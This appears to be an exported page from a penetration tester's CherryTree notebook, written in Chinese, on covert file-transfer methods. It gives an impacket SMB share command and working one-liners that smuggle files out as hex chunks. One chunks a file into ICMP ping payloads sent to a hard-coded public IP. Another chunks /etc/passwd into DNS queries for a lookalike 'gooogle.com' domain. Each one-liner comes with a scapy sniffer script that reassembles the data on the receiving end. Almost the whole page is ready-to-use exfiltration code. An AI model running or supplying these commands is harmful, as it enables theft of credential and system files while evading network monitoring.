<!doctype html><html>
    <head>
      <meta http-equiv="content-type" content="text/html; charset=utf-8">
      <title>其他文件传输方式</title>
      <meta name="generator" content="CherryTree">
      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
    </head>
    <body><div class='page'><h1 class='title'>其他文件传输方式</h1><br/><br /><strong><h2>搭建简易 SMB Server</h2></strong><br />kali自带<br />impacker-smbserver ShareName SharePath<br /><br /><br /><strong><h2>使用 ping 命令进行文件传输</h2></strong><br /><br />发送端：<br />xxd -p -c 4 filename.txt | while read line; do ping -c 1 -p $line 47.96.154.39; done<br /><br />接收端：<br />python3<br /><br /><div class="codebox"><div class="codebox">import&nbsp;sys<br /><br />try:<br />&nbsp;&nbsp;&nbsp;&nbsp;from&nbsp;scapy.all&nbsp;import&nbsp;*<br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Scapy&nbsp;not&nbsp;found,&nbsp;please&nbsp;install&nbsp;scapy:&nbsp;pip&nbsp;install&nbsp;scapy&quot;)<br />&nbsp;&nbsp;&nbsp;&nbsp;sys.exit(0)<br /><br /><br />def&nbsp;process_packet(pkt):<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;pkt.haslayer(ICMP):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;pkt[ICMP].type&nbsp;==&nbsp;8:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;data&nbsp;=&nbsp;pkt[ICMP].load[-4:]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;{data.decode(&quot;utf-8&quot;)}&#39;,&nbsp;flush=True,&nbsp;end=&quot;&quot;,&nbsp;sep=&quot;&quot;)<br /><br />sniff(iface=&quot;eth0&quot;,&nbsp;prn=process_packet)</div></div><br /><br /><br /><br /><h2>使用 dig 命令进行文件传输</h2><br /><br />发送端：<br />xxd -p -c 31 /etc/passwd | while read line; do dig @172.16.1.100 +short +tries=1 +time=1 $line.gooogle.com; done<br /><br />接收端：<br /><div class="codebox"><div class="codebox">try:<br />&nbsp;&nbsp;&nbsp;&nbsp;from&nbsp;scapy.all&nbsp;import&nbsp;*<br />except:<br />&nbsp;&nbsp;&nbsp;&nbsp;print(&quot;Scapy&nbsp;not&nbsp;found,&nbsp;please&nbsp;install&nbsp;scapy:&nbsp;pip&nbsp;install&nbsp;scapy&quot;)<br /><br />def&nbsp;process_packet(pkt):<br />&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;pkt.haslayer(DNS):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;domain&nbsp;=&nbsp;pkt[DNS][DNSQR].qname.decode(&#39;utf-8&#39;)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;root_domain&nbsp;=&nbsp;domain.split(&#39;.&#39;)[1]<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if&nbsp;root_domain.startswith(&#39;gooogle&#39;):<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(f&#39;{bytearray.fromhex(domain[:-13]).decode(&quot;utf-8&quot;)}&#39;,&nbsp;flush=True,&nbsp;end=&#39;&#39;)<br /><br />sniff(iface=&quot;eth0&quot;,&nbsp;prn=process_packet)</div></div><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><br /><p align="center"><img src="images\home.svg" height="22" width="22">  <a href="index.html">索引</a></p></div></body></html>